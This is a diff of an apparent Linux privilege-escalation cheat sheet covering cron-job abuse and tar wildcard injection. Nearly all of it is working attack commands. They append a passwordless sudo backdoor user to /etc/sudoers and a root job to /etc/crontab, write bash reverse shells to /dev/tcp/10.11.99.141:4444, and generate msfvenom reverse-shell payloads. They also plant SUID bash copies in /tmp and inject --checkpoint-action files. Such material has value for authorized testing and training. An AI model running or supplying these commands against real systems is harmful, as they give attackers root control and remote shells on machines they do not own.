@@ -160,13 +160,20 @@ echo 'ali ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
 useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
 ```
 ### /etc/crontab ✡️
+```bash
+echo '* * * * * root overwrite.sh' >> /etc/crontab # If "crontab" was writable 
+```
 #### Cron Jobs - File Permissions 🔆
 ```bash
 cat /etc/crontab
 locate overwrite.sh
-echo '* * * * * root overwrite.sh' >> /etc/crontab
+-------------------------------------------------
 echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
 echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /usr/local/bin/overwrite.sh
+-----------------------OR------------------------
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+-------------------------------------------------
+nc -nvlp 4444 # our kali 
 ```
 #### Cron Jobs - PATH Environment Variable 🔆
 ```bash
@@ -176,13 +183,27 @@ echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /usr/local/bin/overwrite.sh
 echo '#!/bin/bash' > /home/user/overwrite.sh
 echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /home/user/overwrite.sh
 ```
-#### Cron Jobs - Wildcards 🔆
+#### Cron Jobs - Wildcards(1) 🔆
 ```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf # our kali
-chmod +x /home/user/shell.elf # target machine
-touch /home/user/--checkpoint=1 # target machine
-touch /home/user/--checkpoint-action=exec=shell.elf # target machine
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf # our kali 
+# We transfer "shell.elf" file to the target system 
 nc -nvlp 4444 # our kali
+chmod +x /home/user/shell.elf # target machine 
+touch /home/user/--checkpoint=1 # target machine
+touch /home/user/--checkpoint-action=exec=shell.elf # target machine 
+```
+#### Cron Jobs - Wildcards(2) 🔆
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh # target machine 
+chmod +x /home/user/runme.sh # target machine 
+touch /home/user/--checkpoint=1 # target machine
+touch /home/user/--checkpoint-action=exec=bash\ runme.sh # target machine 
+```
+
+
+## Capabilities ✅
+```bash
+
 ```
 ## **SUID_SGID** ✅
 ### Known Exploits ✡️
